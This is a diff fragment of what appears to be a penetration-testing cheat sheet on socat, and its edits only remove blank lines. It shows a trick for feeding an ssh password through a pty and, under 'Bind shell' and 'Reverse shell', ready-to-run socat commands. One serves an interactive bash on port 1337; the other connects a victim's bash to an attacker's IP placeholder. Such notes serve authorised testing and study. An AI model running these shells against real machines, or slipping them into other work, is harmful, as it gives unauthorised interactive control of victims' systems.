@@ -93,7 +93,6 @@ Build a sock proxy for IRM in DMZ
 
 
 (sleep 5; echo PASSWORD; sleep 5; echo ls; sleep 1) | socat - EXEC:'ssh -l user server',pty,setsid,ctty
-
 EXECutes an ssh session to server. Uses a pty for communication between socat and ssh, makes it ssh's controlling tty (ctty), and makes this pty the owner of a new process group (setsid), so ssh accepts the password from socat.
 
 
@@ -104,21 +103,15 @@ Socat
 Netcat on steroids! Seriously tho, go check this tool’s manual man socat and you’d be amazed what you can do with this tool regarding tunneling. Among other things it can spawn a fully interactive shell, even better than the aforementioned python-pty. The downside is that you most probably will have to build/install this tool on the target server as it is not a default utility in most unix-like distributions.
 
 Bind shell
-
 Set listener:
-
 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 
 Connect to the listener:
-
 socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 
 Reverse shell
-
 Set listener:
-
 socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 
 Connect to attacker’s machine:
-
 socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
